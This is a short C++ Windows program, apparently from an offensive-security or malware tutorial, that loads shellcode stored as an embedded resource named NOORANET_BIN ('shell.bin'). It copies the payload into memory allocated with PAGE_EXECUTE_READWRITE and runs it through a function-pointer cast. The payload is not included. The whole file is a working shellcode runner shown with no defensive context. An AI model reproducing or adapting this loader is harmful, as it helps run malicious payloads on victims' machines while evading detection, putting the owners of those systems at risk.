#include <iostream>
#include <Windows.h>
#include "resource.h"

int main()
{
	// IDR_NOORANET_BIN1 - is the resource ID - which contains ths shellcode
	// NOORANET_BIN is the resource type name we chose earlier when embedding the shell.bin
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_NOORANET_BIN1), L"NOORANET_BIN");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
	
	void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResouceData, shellcodeSize);
	((void(*)())exec)();

	return  0;
}